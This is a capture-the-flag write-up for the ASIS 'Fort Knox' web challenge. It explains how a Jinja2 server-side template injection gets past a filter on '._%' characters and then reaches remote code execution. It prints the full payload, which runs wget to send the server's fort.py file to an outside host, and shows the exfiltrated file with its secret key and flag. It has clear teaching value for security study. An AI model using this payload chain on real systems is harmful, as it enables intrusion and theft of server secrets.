# Fort Knox 
>They say the [Fort Knox](http://104.248.237.208:5000/) is impenetrable, but as a friend of mine once said, give me ten brave men and I will conquer it!  
>Are you brave enough!  

This challenge was probably solved by everyone in an unintended way!
By visiting the page and viewing the source, we see the following comment:
```HTML
    <!--Source Code: /static/archive/Source -->
```
We get the application's source code and see this interesting piece of code:
```Python
@app.route("/ask", methods = ["POST"])
def ask():
    question = request.form["q"]
    for c in "._%":
        if c in question:
            return render_template("no.html", err = "no " + c)
    try:
        t = Template(question)
        t.globals = {}
        answer = t.render({
            "history": fort.history(),
            "credit": fort.credit(),
            "trustworthy": fort.trustworthy()
        })
    except:
        return render_template("no.html", err = "bad")
    return render_template("yes.html", answer = answer)
```

So this is jinja2 SSTI without "._%". This whitelist is too permissive to prevent RCE!
As we can see in [Jinja documentation](http://jinja.pocoo.org/docs/2.10/templates/), 

>You can use a dot (.) to access attributes of a variable in addition to the standard Python __getitem__ “subscript” syntax ([]).
>The following lines do the same thing:
>{{ foo.bar }}  
>{{ foo['bar'] }}

So ```[].__class__``` can become ```[]['__class__']``` and because we're dealing with strings, the underscores can become ```\x5f```. So we can get the flag with the following payload:
```
{{[]['\x5f\x5fclass\x5f\x5f']['\x5f\x5fbase\x5f\x5f']['\x5f\x5fsubclasses\x5f\x5f']()['\x5f\x5fgetitem\x5f\x5f'](59)()['\x5fmodule']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['system']('wget xx\x2exx\x2exx\x2exx --post-file fort\x2epy')}}
```
"fort.py" file was disclosed from a line of the source code that called ```import fort```!

Result:
```
Listening on [0.0.0.0] (family 0, port 80)
Connection from [104.248.237.208] port 80 [tcp/http] accepted (family 2, sport 51242)
POST / HTTP/1.1
User-Agent: Wget/1.18 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 51.77.158.67
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 865

from flask import Flask, session

SECKEY = "some random key for signing 70657529378630738104827452603621"
FLAG = "ASIS{Kn0cK_knoCk_Wh0_i5_7h3re?_4nee_Ane3,VVh0?_aNee0neYouL1k3!}"
CORRECT_BEHAVIOUR = list(map(int, "34515465413625214253"))
PERFECT_CREDIT = sum([ x for x in range(len(CORRECT_BEHAVIOUR)) ])
```
There was more python code in that file, which hinted that this was an unintended sollution!
